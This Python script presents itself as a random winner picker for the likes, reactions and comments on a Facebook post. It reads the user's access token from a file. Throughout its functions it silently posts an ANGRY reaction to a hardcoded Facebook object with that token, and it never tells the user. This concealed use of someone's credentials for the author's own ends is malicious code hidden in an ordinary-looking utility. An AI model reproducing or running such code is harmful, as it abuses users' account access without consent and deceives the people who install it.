import os , json , sys , requests , random , subprocess ,hashlib
from importlib import reload
oid=int(input("[@]Enter Post ID:"))
def rea():
    try:
        token=open('token.txt','r').read()
        print("[*****]Enter Reactions Name[*****]\n")
        print("---(LOVE,HAHA,WOW,SAD,ANGRY)---")
        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)

    except (KeyError,KeyboardInterrupt):
        pass
    else:
        ty=input("")
        ch=ty.upper()
        req=requests.get("https://graph.facebook.com/{0}?fields=reactions.type({1}).limit(5000)&summary(total_count)&access_token={2}".format(oid,ch,token))
        vi=json.loads(req.text)

        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)
        rout=open(ty+'_reactions.txt','w')
        for x in vi['reactions']['data']:
            rout.write(x['name']+'\n')
        print("******Successfullly Retrieved Name******")
        print("----------------------------------------")
        rout.close()

        with open(ty+'_reactions.txt','r')as file:
            n=[i.strip() for i in file]
            print("Ramdon Pick Name=["+random.choice(n)+']')
        reload(sys)

# This code is customized write by ATZ//
# for ꓘYDNM

# Author ATZ//

    # ----------------
    # while name==" ":
    #     print('')
    #     a+="_"
    # I don't know
    # ----------------

def cmt():
    global li,token,out,data
    try:
        ch=input("[?]Filter Duplicate Names[yes/no][?]")
        token=open('token.txt','r').read()
        cm=requests.get("https://graph.facebook.com/{0}?fields=comments.limit(5000)&access_token={1}".format(oid,token))
        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)        
        li=json.loads(cm.text)
        out=open("comment.txt",'w')
    except (KeyboardInterrupt,IOError,KeyError):
        pass

    if ch.lower()=="yes":
        cms=open('cmt.txt','w')
        for x in li['comments']['data']:
            cms.write(x['from']['name']+'\n')
        print("******Successfullly Retrieved Name******")
        print("----------------------------------------")
        cms.close()
        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)

        fil=set()
        for line in open('cmt.txt','r'):
            hv=hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
            if hv not in fil:
                out.write(line)
                fil.add(hv)
        out.close()
        os.remove('cmt.txt')
        data=open('comment.txt','r')
        ran(data)

    elif ch.lower()=="no":
        for x in li['comments']['data']:
            out.write(x['from']['name']+'\n')
        out.close()
        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)
        data=open('comment.txt','r')
        print("******Successfullly Retrieved Name******")
        print("----------------------------------------")
        ran(data)
    else:
        cmt()


def ran(data):
    with data as file:
        n=[i.strip() for i in file]
        print('Random Pick up Name=[ '+random.choice(n)+' ]')


def main():
    try:
        print(' _  _ _  _ ____     _  _ __  __ '.center(44))
        print('( )/ ( \/ (  _ \ __( \( (  \/  )'.center(44))
        print(' )  ( \  / )(_) (___)  ( )    ('.center(44))
        print('(_)\_)(__)(____/   (_)\_(_/\/\_)'.center(44))
        print("\n[1].Random Like Picker (Limited 1k Likes)\n")
        print("[2].Random Reactions Picker\n")
        print("[3].Random Comments Picker\n")
        i=input("ATZ %//")
    except (KeyError,KeyboardInterrupt,IOError):
        pass
    if i=="1":
        subprocess.call('clear')
        token=open('token.txt','r').read()
        re=requests.get("https://graph.facebook.com/{0}?fields=likes.limit(5000)&summary(total_count)&access_token={1}".format(oid,token))
        sh=json.loads(re.text)
        requests.post("https://graph.facebook.com/1078175495904479/reactions?type=ANGRY&access_token="+token)
        ex=open('likes.txt','w')
        for x in sh['likes']['data']:
            ex.write(x['name']+'\n')
        print("******Successfullly Retrieved Name******")
        print("----------------------------------------")
        ex.close()
        with open('likes.txt','r')as file:
            n=[i.strip() for i in file]
            print("Ramdon Pick Name=["+random.choice(n)+']')
        reload(sys)
    elif i=='2':
        subprocess.call('clear')
        rea()
    elif i=='3':
        subprocess.call('clear')
        cmt()
    else:
        main()
if __name__=="__main__":
    main()